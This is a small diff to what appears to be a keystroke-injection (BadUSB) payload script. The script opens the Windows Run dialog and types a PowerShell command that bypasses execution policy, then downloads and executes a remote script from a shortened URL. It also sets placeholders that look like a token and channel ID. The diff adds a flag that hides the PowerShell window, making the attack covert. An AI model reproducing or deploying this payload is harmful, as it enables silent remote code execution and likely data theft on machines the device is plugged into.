@@ -15,5 +15,5 @@ CAPSLOCK_DISABLE
 
 GUI r
 DELAY 200
-STRINGLN powershell -NonI -NoP -Ep bypass -c "$tk = '#dc'; $id = '#ch'; irm https://shorturl.at/nwDFY | iex"
+STRINGLN powershell -w h -NonI -NoP -Ep bypass -c "$tk = '#dc'; $id = '#ch'; irm https://shorturl.at/nwDFY | iex"
 CAPSLOCK
